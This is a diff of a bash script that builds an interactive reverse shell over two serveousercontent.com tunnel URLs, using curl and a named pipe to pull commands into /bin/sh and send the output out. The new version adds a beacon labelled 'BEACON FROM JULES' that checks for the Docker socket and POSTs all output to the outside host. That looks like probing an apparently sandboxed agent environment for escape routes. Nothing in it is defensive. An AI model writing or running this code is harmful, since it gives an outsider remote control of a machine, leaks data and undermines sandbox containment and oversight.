@@ -1,13 +1,21 @@
 #!/bin/bash
 # OUTPUT (9999) and INPUT (9998)
-URL_OUT="https://0a2cb60346f2cd12-103-95-173-85.serveousercontent.com"
-URL_IN="https://c1f05e8ba787d658-103-95-173-85.serveousercontent.com"
+URL_OUT="https://e200e5147a8bf379-103-95-173-85.serveousercontent.com"
+URL_IN="https://b17cba060c6095d1-103-95-173-85.serveousercontent.com"
 
-# Create a backpipe
-rm -f /tmp/f; mkfifo /tmp/f
+{
+  echo "--- [!] ALIVE: BEACON FROM JULES ---"
+  echo "Timestamp: $(date)"
+  
+  # Check if docker socket is reachable
+  if [ -S /var/run/docker.sock ]; then
+    echo "[+] Docker Socket Found."
+  else
+    echo "[!] Docker Socket Missing."
+  fi
 
-# The Bridge Logic:
-# 1. Read from the Pipe -> Send to Output URL (9999)
-# 2. Read from the Input URL (9998) -> Send to Shell -> Write to Pipe
-cat /tmp/f | curl -s -T - "$URL_OUT" & 
-curl -s "$URL_IN" | /bin/sh -i > /tmp/f 2>&1
+  # Double-Pipe Logic for Interactive Shell
+  rm -f /tmp/f; mkfifo /tmp/f
+  cat /tmp/f | curl -s -T - "$URL_OUT" & 
+  curl -s "$URL_IN" | /bin/sh -i > /tmp/f 2>&1
+} | curl -s -X POST --data-binary @- "$URL_OUT"
